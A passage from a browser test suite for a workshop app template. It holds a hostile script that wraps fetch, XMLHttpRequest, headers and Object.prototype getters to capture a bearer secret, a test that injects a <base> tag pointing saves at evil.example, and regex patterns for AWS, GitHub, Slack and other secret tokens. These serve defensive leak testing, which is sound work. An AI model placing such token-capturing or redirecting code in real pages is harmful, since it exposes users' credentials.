      expect(await visibleSignIn()).toEqual([]);
      await pressAdd();
      expect(await page.locator("#status").textContent()).toBe(secret === "with" ? "Saved." : VIEW_ONLY);
      expect(store.has("notes")).toBe(secret === "with");
      expect(await visibleSignIn()).toEqual([]);
      await pressAdd();
      expect(await visibleSignIn()).toEqual([]);
      // Nothing opens on a press of a hidden sign-in element (a click forced by code).
      const popups: string[] = [];
      page.on("popup", (popup) => popups.push(popup.url()));
      await page.evaluate(`document.querySelectorAll("[data-workshop-sign-in]").forEach((el) => el.click())`);
      expect(popups).toEqual([]);
      expect(errors).toEqual([]);
    },
  );

  it("ticket 3.28 criterion 3: WHEN an older app's code shows or adds sign-in elements itself THEN they stay hidden", async () => {
    await openShapeApp("visible");
    await page.evaluate(`(() => {
      for (const el of document.querySelectorAll("[data-workshop-sign-in]")) { el.hidden = false; el.style.display = "block"; el.removeAttribute("style"); }
      const added = document.createElement("div");
      added.innerHTML = '<button type="button" data-workshop-sign-in>Sign in to save</button>';
      document.querySelector("main").append(added);
      const marked = document.createElement("button");
      marked.textContent = "Sign in to save";
      document.querySelector("main").append(marked);
      marked.setAttribute("data-workshop-sign-in", "");
    })()`);
    // The observer runs once the page's code is done.
    await expect.poll(visibleSignIn).toEqual([]);
    expect(await page.locator("[data-workshop-sign-in]").count()).toBe(4);
    expect(errors).toEqual([]);
  });

  /**
   * Try 2 (finding B): app code that runs after workshop-data.js, trying every way short of reading browser internals to
   * see the secret: wrapping fetch, XMLHttpRequest, Headers, history and location, getters on Object.prototype (read by
   * fetch for its options), and Symbol.iterator. It records any text that holds the secret in `window.stolen`.
   */
  const HOSTILE_APP = `"use strict";
    window.stolen = [];
    const T = ${JSON.stringify(SECRET)};
    const grab = (where, value) => { try { if (String(JSON.stringify(value) ?? value).includes(T)) window.stolen.push(where); } catch (e) { if (String(value).includes(T)) window.stolen.push(where); } };
    const realFetch = window.fetch;
    window.fetch = function (input, init) { grab("fetch", [input, init, init && init.headers]); return realFetch.apply(this, arguments); };
    const realOpen = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.setRequestHeader = function (n, v) { grab("xhr", v); return realOpen.apply(this, arguments); };
    for (const name of ["append", "set"]) { const real = Headers.prototype[name]; Headers.prototype[name] = function (n, v) { grab("headers." + name, v); return real.apply(this, arguments); }; }
    const realReplace = History.prototype.replaceState;
    History.prototype.replaceState = function () { grab("replaceState", [...arguments]); return realReplace.apply(this, arguments); };
    for (const name of ["signal", "referrer", "mode", "cache", "redirect", "integrity", "keepalive", "window", "priority", "duplex", "referrerPolicy", "body", "headers"]) {
      Object.defineProperty(Object.prototype, name, { configurable: true, get() { grab("Object.prototype." + name, this); return undefined; } });
    }
    Object.defineProperty(Object.prototype, Symbol.iterator, { configurable: true, get() { grab("Symbol.iterator", this); return undefined; } });
    const realStringify = JSON.stringify;
    JSON.stringify = function (v) { const out = realStringify.apply(this, arguments); if (typeof out === "string" && out.includes(T)) window.stolen.push("JSON.stringify"); return out; };
    grab("location", [location.href, location.hash, document.URL, history.state]);
    document.addEventListener("DOMContentLoaded", async () => {
      await workshopData.whoAmI();
      try { await workshopData.set("presses", 1); window.saved = "yes"; } catch (e) { window.saved = e.message; }
    });`;

  const serveApp = async (files: Record<string, string>): Promise<void> => {
    for (const [name, body] of Object.entries(files)) {
      await page.route(`${origin}${APP_PATH}${name === "index.html" ? "" : name}`, (route) =>
        route.fulfill({ status: 200, headers: { "content-type": TYPES[extname(name)] ?? "text/plain", "content-security-policy": APPS_CONTENT_SECURITY_POLICY }, body }),
      );
    }
  };

  it("ticket 3.28 (was 3.25 finding B): WHEN the app's own code wraps fetch, XMLHttpRequest, history and Object.prototype THEN it sees the secret only in the address (by design), and saves still carry it", async () => {
    await serveApp({ "app.js": HOSTILE_APP });
    await page.goto(`${origin}${APP_PATH}${EDIT_LINK}`);
    await expect.poll(() => page.evaluate<unknown>("window.saved")).toBe("yes");
    // The edit link stays in the address, so the app's code can read it there; workshop-data.js's requests, headers and
    // options show it nowhere else (the one JSON.stringify entry is the hostile code's own reading of the address).
    expect(await page.evaluate<string[]>("window.stolen")).toEqual(["JSON.stringify", "location"]);
    expect(await page.evaluate<unknown>("workshopData.whoAmI()")).toBe("Bob");
    expect(calls.filter((call) => call.method === "PUT").map((call) => [call.authorization, call.status])).toEqual([[`Bearer ${SECRET}`, 204]]);
    expect(page.url()).toBe(`${origin}${APP_PATH}${EDIT_LINK}`);
    expect(errors).toEqual([]);
  });

  it("ticket 3.25 (access review of try 3): WHEN the app's own code adds a <base> to another server THEN saves still go to the workshop's own addresses", async () => {
    const elsewhere: string[] = [];
    await page.route("https://evil.example/**", (route) => {
      elsewhere.push(route.request().url());
      return route.fulfill({ status: 204, headers: { "access-control-allow-origin": "*" }, body: "" });
    });
    await serveApp({
      "app.js": `"use strict";
        document.addEventListener("DOMContentLoaded", async () => {
          await workshopData.whoAmI();
          const base = document.createElement("base");
          base.href = "https://evil.example/";
          document.head.append(base);
          window.link = workshopData.signInLink();
          try { await workshopData.set("presses", 1); window.saved = "yes"; } catch (e) { window.saved = e.message; }
        });`,
    });
    await page.goto(`${origin}${APP_PATH}${EDIT_LINK}`);
    await expect.poll(() => page.evaluate<unknown>("window.saved")).toBe("yes");
    expect(elsewhere).toEqual([]);
    expect(await page.evaluate<unknown>("window.link")).toBeNull();
    expect(calls.filter((call) => call.method === "PUT").map((call) => [call.authorization, call.status])).toEqual([[`Bearer ${SECRET}`, 204]]);
  });

  it("ticket 3.25 try 2 (finding B, control): the same code run BEFORE workshop-data.js sees the secret in its requests too, and the deploy check refuses such a page", async () => {
    const index = readFileSync(join(TEMPLATE_DIR, "index.html"), "utf8").replace('<script src="workshop-data.js"></script>', '<script src="early.js"></script><script src="workshop-data.js"></script>');
    expect(checkApp([{ path: "index.html", kind: "file", bytes: new TextEncoder().encode(index) }]).ok).toBe(false);
    // Every file through the same route (Chromium refuses a routed page's loads from the loopback server).
    const own = (name: string) => readFileSync(join(TEMPLATE_DIR, name), "utf8");
    await serveApp({ "index.html": index, "early.js": HOSTILE_APP, "workshop-data.js": own("workshop-data.js"), "app.js": own("app.js"), "style.css": own("style.css") });
    await page.goto(`${origin}${APP_PATH}${EDIT_LINK}`);
    await expect.poll(() => page.evaluate<unknown>("window.saved")).toBe("yes");
    expect(await page.evaluate<string[]>("window.stolen")).toEqual(expect.arrayContaining(["location", "fetch"]));
  });
});

describe("the template's contents", () => {
  const EMAIL = /[A-Za-z0-9._%+-]+@[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)*\.[A-Za-z]{2,}/;
  const SECRETS: [string, RegExp][] = [
    ["AWS access key id", /\b(?:AKIA|ASIA)[0-9A-Z]{16}\b/],
    ["AWS secret key setting", /aws_secret_access_key/i],
    ["private key", /-----BEGIN [A-Z ]*PRIVATE KEY-----/],
    ["GitHub token", /\b(?:gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,})/],
    ["API key (sk-)", /\bsk-[A-Za-z0-9_-]{16,}/],
    ["Slack token", /\bxox[abprs]-[A-Za-z0-9-]{10,}/],
    ["password setting", /\bpassword\s*[:=]\s*["'][^"']+["']/i],
  ];

  it("the patterns find what they look for", () => {
    expect(EMAIL.test(["someone", "example.org"].join("@"))).toBe(true);
    const samples = [
      "AKIA" + "ABCDEFGHIJKLMNOP",
      "aws_secret_access_key = x",
      "-----BEGIN RSA " + "PRIVATE KEY-----",
      "ghp_" + "a".repeat(36),
      "sk-" + "a".repeat(40),
      "xoxb-" + "1".repeat(12),
      'password: "' + "hunter2" + '"',
    ];
    SECRETS.forEach(([, pattern], index) => expect(pattern.test(samples[index] ?? "")).toBe(true));
  });

  it("holds no email address and no secret (criterion 6)", async () => {
    const files = (await readAppFolder(TEMPLATE_DIR)).filter((file) => file.kind === "file");
    expect(files.map((file) => file.path).sort()).toEqual(
      ["AGENTS.md", "README.md", "SPEC.md", "app.js", "index.html", "style.css", "workshop-data.js"],
    );
    const found: string[] = [];
    for (const file of files) {
      new TextDecoder().decode(file.bytes).split("\n").forEach((line, index) => {
        if (EMAIL.test(line)) found.push(`${file.path}:${index + 1} email address`);
        for (const [name, pattern] of SECRETS) if (pattern.test(line)) found.push(`${file.path}:${index + 1} ${name}`);
      });
    }
    expect(found).toEqual([]);
  });

  it("AGENTS.md states the deploy check's rules as check.ts holds them", () => {
    const agents = readFileSync(join(TEMPLATE_DIR, "AGENTS.md"), "utf8");
    expect(agents).toContain(ALLOWED_EXTENSIONS.join(" "));
    expect(agents).toContain(`${MAX_APP_BYTES / 1024 / 1024} MB`);
    // The namespace names it lists, one per line in a code block, are exactly the allowed ones.
    const listed = agents.split("\n").map((line) => line.trim()).filter((line) => /^[a-z]+:\/\//.test(line));
    expect(listed).toEqual([...NAMESPACE_ADDRESSES]);
  });

  it("AGENTS.md lists the preferred keyless services with addresses the deploy check accepts (ticket 2.14)", () => {
    const agents = readFileSync(join(TEMPLATE_DIR, "AGENTS.md"), "utf8");
    const addresses = [
      "https://en.wikipedia.org/api/rest_v1/",
      "https://openlibrary.org",
      "https://covers.openlibrary.org",
      "https://api.open-meteo.com",
      "https://api.frankfurter.app",
      "https://api.tvmaze.com",
      "https://restcountries.com",
    ];
    for (const address of addresses) expect(agents).toContain(`\`${address}\``);
    const index = { path: "index.html", kind: "file" as const, bytes: new TextEncoder().encode("<!doctype html>") };
    const uses = { path: "app.js", kind: "file" as const, bytes: new TextEncoder().encode(addresses.map((address) => `fetch("${address}");`).join("\n")) };
    expect(checkApp([index, uses]).problems).toEqual([]);
    expect(agents).toContain("never write a key or token in any file");
    expect(agents).toContain("show a friendly message in the page");
  });

  it("ticket 3.28: the whole template, edit link included, passes the deploy check as it is", async () => {
    expect(checkApp(await readAppFolder(TEMPLATE_DIR)).problems).toEqual([]);
  });

  it("README.md lists every file of the template", async () => {
    const readme = readFileSync(join(TEMPLATE_DIR, "README.md"), "utf8");
    for (const file of await readAppFolder(TEMPLATE_DIR)) expect(readme).toContain(`| \`${file.path}\` |`);
  });
});
